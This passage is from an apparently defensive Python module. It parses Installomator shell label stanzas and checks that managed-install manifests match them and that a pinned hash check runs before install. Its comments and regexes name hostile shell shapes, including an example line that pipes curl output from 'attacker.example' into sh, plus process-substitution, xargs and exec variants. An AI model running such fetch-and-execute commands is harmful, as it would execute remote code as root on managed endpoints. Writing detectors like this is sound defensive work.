"""Semantic contract for manifest fields that affect managed endpoint installs.

The endpoint executes the label dispatch in ``engine/Installomator.sh``.  This
module parses that source as data and proves every allowlisted manifest record
matches the effective shell values used for artifact selection and install.
It never sources or executes shell code.
"""

from __future__ import annotations

import re
from dataclasses import dataclass


_ARM_RE = re.compile(r"^([A-Za-z0-9_.-]+)(\|\\|\))$")
# PAT-1403 (round 2, Finding 6): a single-line multi-arm pattern, e.g.
# `captureone|captureonepro)` (two or more label names joined by `|`,
# terminated by `)` all on one line — a real, currently-used shape in the
# engine (see e.g. `captureone|captureonepro)`, `synergyeditor|
# synergyeditorbasketball)`). _ARM_RE alone only recognises ONE name per
# line (either ending the arm with `)` or continuing to the next line with
# `|\`), so a line like this previously matched neither branch and was
# silently absorbed into the PRECEDING label's body instead of being
# recognised as a new stanza boundary.
_MULTI_ARM_RE = re.compile(r"^([A-Za-z0-9_.-]+(?:\|[A-Za-z0-9_.-]+)+)\)$")
# PAT-1403 (round 3, Finding 4): the bare `*)` default/catch-all arm (e.g.
# `*) cleanupAndExit 1 "unknown label $label" ;;`, which terminates the real
# label dispatch just before the closing `esac` in engine/fragments/main.sh)
# matched neither _ARM_RE nor _MULTI_ARM_RE, so it was not recognised as a
# stanza boundary at all — its body was silently absorbed into whatever the
# PRECEDING label's stanza was, the same misattribution class the nested-case
# fix and the multi-arm fix above already closed for other boundary shapes.
_DEFAULT_ARM_RE = re.compile(r"^\*\)$")
_ASSIGN_RE = re.compile(r"^\s*([A-Za-z_][A-Za-z0-9_]*)=(.*?)\s*$")
_LITERAL_RE = re.compile(r'^"([^"$`]*)"$')
_ARRAY_RE = re.compile(r"^\(\s*(.*?)\s*\)$")
_ARRAY_TOKEN_RE = re.compile(r'"([^"$`]*)"|\'([^\'$`]*)\'|([^\s"\']+)')

# PAT-1403: a `word)` line matches _ARM_RE regardless of WHY it looks like a
# case arm — including a nested `case ... in` block (e.g. architecture
# branching) legitimately used inside an allowlisted label's own stanza.
# Relying on indentation/quoting conventions to keep such a line from being
# mistaken for the next top-level label boundary is fragile (nothing enforces
# those conventions); the stanza walker below instead tracks case/esac
# nesting explicitly so a nested block's arms can never be mistaken for a new
# label stanza, regardless of formatting.
_CASE_OPEN_RE = re.compile(r"^\s*case\b.*\bin\s*$")
_CASE_CLOSE_RE = re.compile(r"^\s*esac\s*$")

# PAT-1403: the only non-assignment construct inside a managed stanza that is
# provably inert for artifact-identity purposes — a fully literal (no `$`,
# no backtick) printlog call only ever writes to the log. Every other
# non-assignment line (function definitions, control-flow keywords, bare
# commands, nested case blocks) is unmodelled shell and must fail closed
# rather than be silently ignored — see _is_benign_non_assignment below.
_PRINTLOG_LITERAL_RE = re.compile(r'^\s*printlog\s+"[^"$`]*"(?:\s+[A-Za-z]+)?\s*$')

# PAT-1403 (round 2, Finding 1): the four markers
# _engine_pins_downloaded_artifact_hash looks for, now tracked by LINE INDEX
# (not just "found somewhere") so relative ORDER can be proven, plus a
# lightweight, line-oriented nesting scanner (NOT a full shell parser — see
# that function's docstring) used to prove the check sits at the top level of
# the main script flow rather than inside a per-label or otherwise
# conditional construct that could exclude specific labels.
_MIRROR_HASH_IF_RE = re.compile(r'if \[\[ -n "\$\{PINNED_SHA256:-\}" \]\]; then')
_MIRROR_HASH_SHASUM_RE = re.compile(r'shasum -a 256 "\$archiveName"')
_MIRROR_HASH_MISMATCH_RE = re.compile(r'if \[\[ "\$_computed_sha256" != "\$PINNED_SHA256" \]\]; then')
_MIRROR_HASH_EXIT_RE = re.compile(r'cleanupAndExit \d+ "SHA-256 mismatch')
# The known install-function calls the `case $type in ... esac` install
# dispatch invokes (see the bottom of Installomator.sh's main flow) — used
# only to prove the hash check is reachable BEFORE installation proceeds.
_INSTALL_CALL_RE = re.compile(
    r'^\s*(installFromDMG|installFromPKG|installFromZIP|installFromTBZ|'
    r'installPkgInDmg|installPkgInZip|installAppInDmgInZip)\s*$'
)
# Nesting-delta tokens: an `if`/`fi` or `for|while|until`/`done` pair opens
# and closes a block; a `case ... in` / `esac` pair (already tracked above
# via _CASE_OPEN_RE/_CASE_CLOSE_RE) does the same. The anchor class
# `(?:^|[;(`|&])` requires the keyword to start a new shell statement —
# immediately after line-start, a statement separator, a command
# substitution's opening `(`, a pipe, or `&&`/`&` — so it does not fire on
# "elif" (which does not begin with "if" at that anchor) or on plain English
# text. This deliberately does not attempt full shell parsing (e.g. it does
# not track `{`/`}` function bodies, which do not occur in the region this
# is applied to); see _engine_pins_downloaded_artifact_hash for the bounded
# claim this scan is used to support.
_IF_OPEN_RE = re.compile(r'(?:^|[;(`|&])\s*if\b')
_IF_CLOSE_RE = re.compile(r'(?:^|[;(`|&])\s*fi\b')
_LOOP_OPEN_RE = re.compile(r'(?:^|[;(`|&])\s*(?:for|while|until)\b')
_LOOP_CLOSE_RE = re.compile(r'(?:^|[;(`|&])\s*done\b')

_TYPE_TO_SHELL = {
    "dmg": "dmg",
    "pkg": "pkg",
    "zip": "zip",
    "tbz": "tbz",
    "appindmg": "appInDmg",
    "appinzip": "appInZip",
    "pkgindmg": "pkgInDmg",
    "pkginzip": "pkgInZip",
    "appindmginzip": "appInDmgInZip",
}

# These change which bytes or payload the engine installs. PAT-1385 owns the
# pkgName representation. Every other field must remain absent from a managed
# stanza until the typed manifest can express it.
_UNMODELLED_EXECUTION_FIELDS = {
    "archiveName", "appName", "packageID", "pkgName", "choiceChangesXML",
    "installerTool", "CLIInstaller", "CLIArguments", "updateTool",
    "updateToolArguments", "updateToolRunAsCurrentUser", "curlOptions",
    "targetDir", "install", "uninstall",
}

_MODELLED_FIELDS = {
    "name", "type", "downloadURL", "expectedTeamID", "blockingProcesses",
    "versionKey",
}

# Available-version resolution controls the engine's early "already current"
# exit but not artifact identity. Its expressions remain shell-owned for the
# seven current managed labels. Keep the permitted variables exhaustive so a
# new split execution field cannot silently enter an allowlisted stanza.
_VERSION_RESOLVER_FIELDS = {"appNewVersion", "firefoxVersions"}

# PAT-1403 (round 4, Finding 2): the _VERSION_RESOLVER_FIELDS exemption above
# is purely NAME-based — it removes appNewVersion/firefoxVersions from the
# "unclassified field" check with zero inspection of what the assigned
# expression actually does. That is sound for the exemption's own stated
# purpose (these fields only gate the early "already current" exit, not
# artifact identity), but it is silent on a DIFFERENT property: whether the
# expression smuggles arbitrary code execution disguised as a version check,
# e.g. `appNewVersion=$(curl attacker.example/x | sh)` — which would run as
# root on every endpoint update and is exactly the construct the shell_only
# fail-closed rule above exists to reject everywhere else in a managed
# stanza. `$(...)` command substitution itself is NOT flagged — every real,
# currently-shipped assignment (see the seven labels above) legitimately
# uses `$(curl ... | grep/awk/sed/cut/xpath/getJSONValue ...)` to resolve a
# version string, and that shape must keep passing (see
# test_version_resolver_field_value_shape_checks's real-corpus assertions).
# This does NOT attempt to validate that the version-resolution logic is
# CORRECT (out of scope — these fields are legitimately shell-owned for the
# "is an update available" check), only that it isn't executing fetched
# content.
#
# PAT-1403 (round 7, Finding 1): the original denylist here only covered a
# pipe into sh/bash/zsh/eval and backtick substitution — a round 7 review
# found real, equally-dangerous shapes it missed entirely:
#   - piping into ANY interpreter, not just the four shell ones (python,
#     perl, ruby, node, php, osascript — see _SCRIPTABLE_INTERPRETERS below);
#   - a two-step "download to a file, then execute it" shape joined by a
#     command SEPARATOR rather than a pipe, e.g. `$(curl ... -o /tmp/a; sh
#     /tmp/a)` — the old regex only ever looked for `| sh`, never `; sh` or
#     a bare interpreter invocation as the head of a command;
#   - process substitution, e.g. `$(sh <(curl ...))`, where the interpreter
#     is the HEAD of the outer `$(...)` substitution, not anyone's pipe
#     target.
# Broadening a fixed denylist is inherently an arms race (this finding is
# itself the second round to do so), so an ALLOWLIST alternative — accept
# only known-safe command shapes (`curl ... | grep/awk/sed/cut/xpath/
# getJSONValue/plutil ...`), reject everything else — was seriously
# considered first. It was rejected as disproportionate here: correctly
# tokenising an arbitrary shell pipeline (quoting, nested `$(...)`/`<(...)`,
# `&&`/`||` chains, and loop constructs all appear in real shipped
# expressions) to classify every command word is most of a real shell
# parser, which this file has deliberately avoided writing anywhere else
# (see e.g. _engine_pins_downloaded_artifact_hash's own "NOT a full shell
# parser" disclaimer). The broadened denylist below was instead calibrated
# directly against the real corpus: every appNewVersion/firefoxVersions
# assignment across all labels in engine/Installomator.sh (not just the
# seven currently allowlisted ones — see
# test_version_resolver_field_value_shape_checks) plus ghostty's real
# mirrored downloadURL (see test_mirror_exempted_downloadurl_value_shape_checks).
# That calibration surfaced a real nuance a naive "ban piping into
# python/perl" rule would have gotten wrong: real, currently-shipped labels
# like digiexam (`curl ... | perl -ne '...'`) and mkuser (`osascript -l
# JavaScript -e '...' -- "$(curl ...)"`) legitimately pipe/pass fetched
# content into perl/osascript as DATA for a fixed, literal inline script to
# filter or parse — the same shape `| grep`/`| sed` already gets a pass for,
# and flagging it would have been a false positive on real shell text this
# check must not break if either label is ever allowlisted. What actually
# distinguishes those from `| sh` or a bare `| python3` with no script
# argument is whether the interpreter has a recognised inline-script flag
# (`-c`/`-e`/`-E`/`-ne`/`-pe`/`-Ee`) in its own command segment: with one,
# the interpreter's PROGRAM is the fixed literal that flag carries and
# the piped/fetched bytes are merely its input DATA; without one, the
# interpreter reads its whole program from stdin/argv, i.e. executes
# whatever was fetched AS CODE. sh/bash/zsh/dash/ksh/csh/tcsh/eval get no
# such benefit of the doubt — a flag doesn't stop piped stdin from also
# being sourced as commands — so those stay unconditionally dangerous
# regardless of flags (see the `bash -c -` case in
# test_version_resolver_field_value_shape_checks). `xargs` gets its own
# check: it hands piped/fetched content to whatever command follows as
# ARGUMENTS, so `curl ... | xargs sh` (or `xargs -I{} sh -c '{}'`) is
# dangerous however it's spelled, with no inline-script exception. This
# remains a lightweight, line-of-text heuristic, not a real parser: it
# cannot see whether an inline script itself goes on to `eval`/`exec` its
# own stdin (e.g. `python3 -c "exec(sys.stdin.read())"` would NOT be
# flagged) — closing that would require inspecting the inline script's own
# content, which no real shipped label does today and which a true
# allowlist wouldn't meaningfully do better at either without executing it.
#
# PAT-1403 (round 8, Finding 1): round 7's own list above included `-r` and
# `-l` as "recognised inline-script flags", but neither actually carries a
# fixed literal script the way `-c`/`-e`/`-E`/`-ne`/`-pe` do, so both let a
# genuinely dangerous invocation slip past as if it were the safe
# digiexam/mkuser shape:
#   - `-l` (osascript): selects the SCRIPTING LANGUAGE (AppleScript vs
#     JavaScript), not a script argument. `osascript -l JavaScript` alone
#     still reads its program from stdin — `curl ... | osascript -l
#     JavaScript` with no `-e` executes the fetched bytes AS CODE exactly
#     like a bare `| osascript` would. The real mkuser invocation
#     (`osascript -l 'JavaScript' -e 'run = argv => ...' -- "$(curl ...)"`)
#     is safe not because of `-l` but because `-e` is ALSO present in the
#     same segment and supplies the actual fixed literal; `-e` alone (still
#     in this list) already covers that case, so dropping `-l` costs
#     nothing against the real corpus (verified: engine/Installomator.sh's
#     only other `-l`-flagged osascript invocation is inside the
#     `getJSONValue()` helper function's own body (`printf '%s' "$1" |
#     osascript -l 'JavaScript' -e ... -e ...`, also multi-`-e`-flagged and
#     thus already safe on its own terms) — labels that use that helper call
#     it BY NAME, e.g. `appNewVersion=$(getJSONValue "$(curl ...)" "version")`,
#     so the helper's own osascript text never appears in the RHS text this
#     function scans in the first place).
#   - `-r` means something different, and never "inline literal script", for
#     every interpreter in _SCRIPTABLE_INTERPRETERS: perl has no `-r` flag
#     at all; ruby's and node's `-r`/`--require` PRELOADS A LIBRARY MODULE
#     before running whatever program follows (or is read from stdin) — it
#     does not supply the program itself, so `curl ... | ruby -r net/http`
#     would still execute the piped bytes as the actual script; only php's
#     `-r 'code'` is a genuine literal-script flag (php's equivalent of
#     python's `-c`), but no shipped label anywhere in engine/Installomator.sh
#     invokes `php` as a CLI interpreter at all (its only appearances are
#     `.php` URL path segments) — see
#     test_version_resolver_shape_check_rejects_round_8_bypass_shapes, so
#     removing `-r` outright costs nothing against the real corpus today. If
#     a real `php -r '...'` shape is ever shipped, it needs its own
#     interpreter-specific carve-out (matching `php` specifically), not a
#     flag this generic, interpreter-agnostic regex treats as universally
#     safe — the same mistake `-l`/`-r` made here.
_ALWAYS_DANGEROUS_INTERPRETERS = ("sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "eval")
_SCRIPTABLE_INTERPRETERS = ("python3?", "perl", "ruby", "node", "nodejs", "php", "osascript")
# Anchor a candidate interpreter word to the START of a shell command: line
# start, or immediately after a pipe/semicolon/backtick/`&`/`(` (the last of
# which also covers the head of a `$(...)` substitution) — optionally
# followed by a transparent `exec ` prefix (PAT-1403 round 8, Finding 2:
# `exec` replaces the current shell with the command that follows without
# spawning a subshell, so `curl ... | exec sh` is exactly as dangerous as
# `curl ... | sh` and must not evade detection merely because `exec` sits
# between the separator and the interpreter word — no shipped label uses
# `exec ` anywhere in engine/Installomator.sh today, so recognising it here
# costs nothing against the real corpus; this is a single transparent-prefix
# token, not general shell parsing, so it stays within this file's existing
# "lightweight heuristic, not a real parser" bound), then optionally a path
# prefix (`/bin/sh`, `./sh`) and/or `env `.
_INTERPRETER_ANCHOR = r"(?:^|[;(`|&])\s*(?:exec\s+)?(?:[./][^\s|;&]*/)?(?:env\s+)?"
_ALWAYS_DANGEROUS_RE = re.compile(
    _INTERPRETER_ANCHOR + r"(" + "|".join(_ALWAYS_DANGEROUS_INTERPRETERS) + r")\b")
_SCRIPTABLE_INTERPRETER_RE = re.compile(
    _INTERPRETER_ANCHOR + r"(" + "|".join(_SCRIPTABLE_INTERPRETERS) + r")\b")
_XARGS_INTERPRETER_RE = re.compile(
    r"\bxargs\b[^|;&\n]*?\b(?:"
    + "|".join(_ALWAYS_DANGEROUS_INTERPRETERS + _SCRIPTABLE_INTERPRETERS) + r")\b")
# PAT-1403 (round 8, Finding 1): `-r` and `-l` removed — see the round 8
# comment block above _ALWAYS_DANGEROUS_INTERPRETERS for why neither
# actually carries an inline literal script.
_INLINE_SCRIPT_FLAG_RE = re.compile(r"(?:^|\s)-(?:c|e|E|ne|pe|Ee)\b")
_SEGMENT_END_RE = re.compile(r"[|;&`]")
_BACKTICK_RE = re.compile(r"`")


def _unsafe_version_resolver_shape(value: str) -> str | None:
    """Return a human-readable reason if `value` (the raw RHS text of a shell
    field assignment) smuggles code execution disguised as ordinary shell
    text, else None.

    Originally written for _VERSION_RESOLVER_FIELDS assignments (see the
    comment above this function), but the check itself is generic — it
    inspects only the RHS text's shape, never the field name — so PAT-1403
    round 6 also reuses it for the mirror-exempted downloadURL check below
    (see managed_execution_contract_errors) rather than duplicating the same
    regexes a second time."""
    if _ALWAYS_DANGEROUS_RE.search(value):
        return "pipes, chains into, or substitutes a shell interpreter"
    if _XARGS_INTERPRETER_RE.search(value):
        return "pipes fetched/derived content through xargs into an interpreter"
    for match in _SCRIPTABLE_INTERPRETER_RE.finditer(value):
        rest = value[match.end():]
        end = _SEGMENT_END_RE.search(rest)
        segment = rest[:end.start()] if end else rest
        if not _INLINE_SCRIPT_FLAG_RE.search(segment):
            return (
                f"invokes {match.group(1)} without a literal inline-script flag "
                "(would execute piped/fetched content as code)")
    if _BACKTICK_RE.search(value):
        return "uses backtick command substitution"
    return None

# PAT-1403 (round 2, Finding 2): the manifest's `name` field is a
# human-readable DISPLAY identifier. It is emitted as the `name` column of
# the derived endpoint allowlist (endpoint/labels-allowlist.txt) and flows
# ONLY into the provenance/telemetry record (`app.name` in
# patched-update.sh's JSON output) — never into any execution path. The
# shell's `name=` assignment is the internal identifier that actually drives
# execution (app_path derivation, archiveName, the blockingProcesses `$name`
# fallback) and is already reconciled against the manifest separately via
# the app_path comparison below. The two are EXPECTED to match by default —
# any label listed here is a specific, reviewed exception where they
# intentionally differ, with the shell's actual name (as a belt-and-braces
# check that the exception itself hasn't silently drifted) and the reason
# recorded alongside it. Any OTHER allowlisted label whose manifest name
# diverges from the shell's name= is unreviewed drift and fails closed.
_DISPLAY_NAME_EXCEPTIONS = {
    # zoom.json's own `patched.notes` documents this: "Installed bundle is
    # zoom.us.app — note the bundle name differs from the label." The shell
    # stanza's name="zoom.us" drives the real /Applications/zoom.us.app path
    # (already verified via the app_path check below); "Zoom" is the
    # human-readable display name shown in reporting.
    "zoom": "zoom.us",
    # firefox.json's manifest name is the full product name; the shell
    # stanza's name="Firefox" drives /Applications/Firefox.app (already
    # verified via the app_path check below). "Mozilla Firefox" is the
    # human-readable display name shown in reporting.
    "firefox": "Firefox",
}


@dataclass(frozen=True)
class ShellLabel:
    assignments: dict[str, tuple[str, ...]]
    occurrences: int = 1
    # PAT-1403: non-assignment shell text found directly inside this stanza
    # (excluding the interior of any nested case block, which is opaque —
    # its mere presence is what's recorded). Non-empty means the stanza
    # cannot be certified: see managed_execution_contract_errors.
    shell_only: tuple[str, ...] = ()

    def values(self, field: str) -> tuple[str, ...]:
        return self.assignments.get(field, ())


def _is_benign_non_assignment(line: str) -> bool:
    """Lines that carry no execution-affecting meaning: blank, a comment, the
    case-arm terminator, or a fully literal printlog call (see
    _PRINTLOG_LITERAL_RE above)."""
    stripped = line.strip()
    if stripped == "" or stripped.startswith("#") or stripped == ";;":
        return True
    return bool(_PRINTLOG_LITERAL_RE.match(line))


def _arm_boundary(line: str) -> tuple[list[str], bool] | None:
    """Return (label_names, continues) if `line` opens (or continues) a
    top-level label-arm boundary, else None.

    Two independent shapes are recognised (PAT-1403 round 2, Finding 6):
    one name per line — either terminated (`label)`) or continued onto the
    next line (`label|\\`) — via _ARM_RE, and two-or-more names joined by
    `|` and terminated on the SAME line (`foo|bar|baz)`) via _MULTI_ARM_RE.
    The latter never continues onto a further line."""
    if match := _ARM_RE.fullmatch(line):
        return [match.group(1)], match.group(2) == "|\\"
    if match := _MULTI_ARM_RE.fullmatch(line):
        return match.group(1).split("|"), False
    if _DEFAULT_ARM_RE.fullmatch(line):
        # PAT-1403 (round 3, Finding 4): a boundary, but not a real label —
        # an empty label list means the caller's `for label in labels: ...`
        # attribution loop naturally does nothing, so the catch-all's body
        # is neither attributed to the preceding label nor treated as if `*`
        # were itself an allowlisted label name. It also never continues
        # (`*` is always the final arm; a continuation would require another
        # pattern after a `|`, which is not a shape this dispatch uses).
        return [], False
    return None


def parse_installomator_labels(engine_text: str) -> dict[str, ShellLabel]:
    lines = engine_text.splitlines()
    starts = [i for i, line in enumerate(lines) if line == "case $label in"]
    if len(starts) != 1:
        raise ValueError(f"expected one top-level case $label dispatch, found {len(starts)}")

    result: dict[str, ShellLabel] = {}
    i = starts[0] + 1
    while i < len(lines):
        if lines[i] == "esac":
            break
        boundary = _arm_boundary(lines[i])
        if boundary is None:
            i += 1
            continue
        labels, continues = boundary
        while continues:
            i += 1
            if i >= len(lines) or (boundary := _arm_boundary(lines[i])) is None:
                raise ValueError(f"malformed continued label arm at line {i + 1}")
            more_labels, continues = boundary
            labels.extend(more_labels)

        values: dict[str, list[str]] = {}
        shell_only: list[str] = []
        i += 1
        # PAT-1403: nested_case_depth > 0 means we are inside a nested `case
        # ... in` block belonging to THIS stanza (e.g. architecture
        # branching). While inside it, a bare `word)` line must never be
        # treated as the next top-level label-arm boundary, and none of its
        # interior lines (which may themselves look like assignments, e.g. a
        # nested `cpu_arch="..."`) are attributed to this label's fields.
        # The loop condition below is depth-gated on BOTH boundary markers —
        # a nested block's own `esac` must not be mistaken for the dispatch's
        # closing esac either, however it happens to be indented.
        nested_case_depth = 0
        while i < len(lines) and not (
            nested_case_depth == 0 and (lines[i] == "esac" or _arm_boundary(lines[i]) is not None)
        ):
            line = lines[i]
            if nested_case_depth > 0:
                if _CASE_OPEN_RE.match(line):
                    nested_case_depth += 1
                elif _CASE_CLOSE_RE.match(line):
                    nested_case_depth -= 1
            elif _CASE_OPEN_RE.match(line):
                shell_only.append(line.strip())
                nested_case_depth = 1
            elif assignment := _ASSIGN_RE.fullmatch(line):
                values.setdefault(assignment.group(1), []).append(assignment.group(2))
            elif not _is_benign_non_assignment(line):
                shell_only.append(line.strip())
            i += 1
        shell_label = ShellLabel(
            {key: tuple(rhs) for key, rhs in values.items()}, shell_only=tuple(shell_only)
        )
        for label in labels:
            if label in result:
                first = result[label]
                result[label] = ShellLabel(
                    first.assignments, first.occurrences + 1, first.shell_only + shell_label.shell_only
                )
            else:
                result[label] = shell_label
    else:
        raise ValueError("top-level label dispatch has no closing esac")
    return result


def _one_literal(shell: ShellLabel, field: str) -> tuple[str | None, str | None]:
    values = shell.values(field)
    if len(values) != 1:
        return None, f"must assign {field} exactly once, found {len(values)}"
    match = _LITERAL_RE.fullmatch(values[0])
    if not match:
        return None, f"{field} must be one static quoted value, got {values[0]!r}"
    return match.group(1), None


# PAT-1403 (round 5, Finding 1): main.sh's fallback line is the UNQUOTED
# assignment `blockingProcesses=( "$name" )` (see engine/fragments/main.sh).
# PAT-1403: this line used to be unquoted (`blockingProcesses=( $name )`),
# which word-split $name before building the array -- for any label whose
# `name` contains whitespace (e.g. `name="Google Chrome"`) the runtime array
# had one element per word (`Google`, `Chrome`), silently defeating the
# downstream `pgrep -x` blocking-process check (no real process is ever
# named just "Google" or just "Chrome"). This contract's own real-corpus
# check against `engine/labels/googlechrome.json` caught the live
# discrepancy; the fallback assignment itself was fixed (quoted) rather than
# the manifest, since the array is documented (main.sh) as one full
# process-name string per element and a real macOS process name can and
# does contain spaces. `[name]` now correctly matches the real, quoted
# runtime array.
def _fallback_blocking_processes(name: str) -> list[str]:
    return [name]


def _effective_blocking_processes(shell: ShellLabel, name: str) -> tuple[list[str] | None, str | None]:
    values = shell.values("blockingProcesses")
    if not values:
        # No assignment at all: main.sh's `[[ -z $blockingProcesses ]]`
        # fallback fires and substitutes the label's own app name — via the
        # unquoted `blockingProcesses=( $name )` word-splitting shape
        # documented above.
        return _fallback_blocking_processes(name), None
    if len(values) != 1 or not (match := _ARRAY_RE.fullmatch(values[0])):
        return None, f"blockingProcesses must be one literal array, got {list(values)!r}"
    tokens = []
    position = 0
    for token in _ARRAY_TOKEN_RE.finditer(match.group(1)):
        if match.group(1)[position:token.start()].strip():
            return None, f"unsupported blockingProcesses syntax: {values[0]!r}"
        value = next(group for group in token.groups() if group is not None)
        if "$" in value or "`" in value:
            return None, f"blockingProcesses contains executable expansion: {values[0]!r}"
        tokens.append(value)
        position = token.end()
    if match.group(1)[position:].strip():
        return None, f"unsupported blockingProcesses syntax: {values[0]!r}"
    if not tokens:
        # PAT-1403: an explicit `blockingProcesses=( )` is indistinguishable
        # from no assignment at all at runtime — zsh's `[[ -z $blockingProcesses ]]`
        # is true for an empty array too (verified against main.sh), so the
        # same $name fallback fires (see the unquoted-word-splitting note
        # above _effective_blocking_processes). Certifying this as `[]`
        # would let a manifest declare "nothing is blocked" while the
        # endpoint still blocks on the app's own process name.
        return _fallback_blocking_processes(name), None
    if tokens == ["NONE"]:
        # Upstream Installomator's explicit "no blocking processes" sentinel.
        # blockingProcesses=( NONE ) is non-empty, so the -z fallback above
        # does NOT fire — but main.sh's own runtime check
        # (`${blockingProcesses[1]} != "NONE"`) skips checkRunningProcesses
        # entirely. This is the one shell spelling that is genuinely,
        # provably equivalent to an empty manifest blocking_processes list.
        return [], None
    return tokens, None


def _engine_pins_downloaded_artifact_hash(engine_text: str) -> bool:
    """Return True only if the shipped engine unconditionally verifies a
    supplied PINNED_SHA256 argument against the downloaded artifact for every
    label — i.e. the check lives outside (after) the `case $label ... esac`
    dispatch, so no per-label branch can disable it.

    This is what the mirror-URL downloadURL exemption below actually rests
    on: a manifest merely DECLARING mirror_url/pinned_sha256 proves nothing
    about the endpoint on its own. Different bytes at a mirror-resolved URL
    can only "not install successfully" if the engine actually checks the
    hash.

    PAT-1403 (round 2, Finding 1): presence of the four markers ANYWHERE
    after the label dispatch does not by itself prove the check is
    unconditional — it would "pass" a version wrapped in
    `if [[ $label != ghostty ]]; then ... fi`, or reordered so the abort
    path runs after installation. This function now proves three additional,
    genuinely structural properties rather than resting on textual presence
    alone:
      1. ORDER — the four markers occur in the order they must execute in:
         the PINNED_SHA256 guard opens, the archive is hashed, the mismatch
         is checked, then the abort is reachable.
      2. NOT NESTED — the guard opens at nesting depth 0 relative to the
         top of the main script flow (immediately after the label dispatch
         closes), tracked via a line-oriented if/fi, case/esac and
         for|while|until/done scanner (see the module-level regexes above).
         A per-label conditional wrapping the check would open at depth
         >= 1 and be rejected. This is NOT a full shell parser — it does
         not track `{`/`}` function bodies or single-line `case ... esac`,
         neither of which occur in the scanned region today — so it is a
         bounded, not universal, structural proof.
      3. BEFORE INSTALL — the mismatch-abort path is reachable before any
         install-function call, so a hash mismatch cannot be bypassed by an
         install step that already ran.
    """
    lines = engine_text.splitlines()
    try:
        start = lines.index("case $label in")
    except ValueError:
        return False
    # PAT-1403 (round 3, Finding 5): find the esac that actually CLOSES
    # *this* case (nesting-aware via the same _CASE_OPEN_RE/_CASE_CLOSE_RE
    # tracking parse_installomator_labels already uses for stanza
    # boundaries), rather than the first line that merely equals "esac". A
    # literal first-match scan would misidentify a NESTED case's own esac as
    # the top-level close if it were ever unindented to column 0 — the same
    # boundary-misattribution fragility class round 1 already fixed for
    # label-stanza detection, just for this second "where does the dispatch
    # end" scan. Real engine text keeps nested arch-branch esacs indented
    # (so they don't match a literal "esac" equality check either), meaning
    # this and the old literal-match behave identically on the real,
    # currently-shipped Installomator.sh; this only changes behaviour for
    # adversarial/pathological (e.g. test-only) shapes.
    depth = 1
    end = None
    for i in range(start + 1, len(lines)):
        if _CASE_OPEN_RE.match(lines[i]):
            depth += 1
        elif _CASE_CLOSE_RE.match(lines[i]):
            depth -= 1
            if depth == 0:
                end = i
                break
    if end is None:
        return False
    tail = lines[end + 1:]

    if_idx = next((i for i, l in enumerate(tail) if _MIRROR_HASH_IF_RE.search(l)), None)
    shasum_idx = next((i for i, l in enumerate(tail) if _MIRROR_HASH_SHASUM_RE.search(l)), None)
    mismatch_idx = next((i for i, l in enumerate(tail) if _MIRROR_HASH_MISMATCH_RE.search(l)), None)
    exit_idx = next((i for i, l in enumerate(tail) if _MIRROR_HASH_EXIT_RE.search(l)), None)
    if if_idx is None or shasum_idx is None or mismatch_idx is None or exit_idx is None:
        return False

    # 1. ORDER.
    if not (if_idx < shasum_idx < mismatch_idx < exit_idx):
        return False

    def _nesting_delta(line: str) -> int:
        # PAT-1403 (round 3, Finding 5): skip comment lines before matching
        # any nesting token. This scans raw lines of the whole post-dispatch
        # tail, including comment prose (this very round's own diff added
        # ~40 lines of prose comments into exactly this scanned region) —
        # ordinary English text like "if this changes", "look at (if
        # needed)", "loop for each", or "done; fi" inside a comment must not
        # perturb the computed nesting depth and silently flip the
        # mirror-URL downloadURL exemption. Same comment convention
        # _is_benign_non_assignment already uses elsewhere in this file: a
        # line whose first non-whitespace character is '#'.
        if line.strip().startswith("#"):
            return 0
        if _CASE_OPEN_RE.match(line):
            return 1
        if _CASE_CLOSE_RE.match(line):
            return -1
        delta = len(_IF_OPEN_RE.findall(line)) - len(_IF_CLOSE_RE.findall(line))
        delta += len(_LOOP_OPEN_RE.findall(line)) - len(_LOOP_CLOSE_RE.findall(line))
        return delta

    # 2. NOT NESTED: depth must be exactly 0 immediately before the guard
    # opens — anything else means it is inside a conditional/loop/case that
    # could exclude specific labels.
    depth = 0
    for line in tail[:if_idx]:
        depth += _nesting_delta(line)
    if depth != 0:
        return False

    # Walk forward from the guard's own opening line to find ITS matching
    # closing `fi`, so "before install" below checks the whole guarded
    # block, not just the opening line.
    depth = 1
    fi_idx = None
    for offset, line in enumerate(tail[if_idx + 1:], start=if_idx + 1):
        depth += _nesting_delta(line)
        if depth == 0:
            fi_idx = offset
            break
    if fi_idx is None:
        return False

    # 3. BEFORE INSTALL.
    install_idx = next((i for i, l in enumerate(tail) if _INSTALL_CALL_RE.match(l)), None)
    if install_idx is None or not (fi_idx < install_idx):
        return False

    return True


def managed_execution_contract_errors(records: list[dict], engine_text: str) -> list[str]:
    """Return all semantic drift errors for endpoint-allowlisted records."""
    try:
        shell_labels = parse_installomator_labels(engine_text)
    except ValueError as exc:
        return [f"Installomator parser: {exc}"]

    # PAT-1403: computed once — whether this exact engine text can be shown
    # to verify PINNED_SHA256 against the downloaded artifact for every
    # label, unconditionally. See _engine_pins_downloaded_artifact_hash.
    engine_verifies_pinned_hash = _engine_pins_downloaded_artifact_hash(engine_text)

    errors: list[str] = []
    for index, record in enumerate(records):
        if not isinstance(record, dict):
            continue
        patched = record.get("patched")
        if not isinstance(patched, dict) or patched.get("allowlisted") is not True:
            continue
        label = record.get("label")
        if not isinstance(label, str) or not label:
            errors.append(f"managed record {index}: missing valid label")
            continue
        shell = shell_labels.get(label)
        if shell is None:
            errors.append(f"{label}: allowlisted record has no executable Installomator stanza")
            continue
        if shell.occurrences != 1:
            errors.append(
                f"{label}: allowlisted record has {shell.occurrences} Installomator stanzas; "
                "runtime selection would be ambiguous")
            continue

        if shell.shell_only:
            errors.append(
                f"{label}: managed stanza contains shell-only construct(s) not modelled by "
                f"the contract: {shell.shell_only!r}; refuse to certify it as within contract "
                "until the construct is modelled or removed")
            continue

        unknown_fields = (
            set(shell.assignments)
            - _MODELLED_FIELDS
            - _UNMODELLED_EXECUTION_FIELDS
            - _VERSION_RESOLVER_FIELDS
        )
        for field in sorted(unknown_fields):
            errors.append(
                f"{label}: managed stanza sets unclassified field {field}; "
                "classify and reconcile it before allowlisting")

        for field in sorted(_UNMODELLED_EXECUTION_FIELDS):
            if shell.values(field):
                errors.append(
                    f"{label}: managed stanza sets unsupported execution field {field}; "
                    "model it in the typed manifest before allowlisting")

        # PAT-1403 (round 4, Finding 2): the _VERSION_RESOLVER_FIELDS name
        # exemption above only removes these fields from the "unclassified
        # field" check; it says nothing about the VALUE. Check the shape of
        # every value assigned to them, even though the field is exempt from
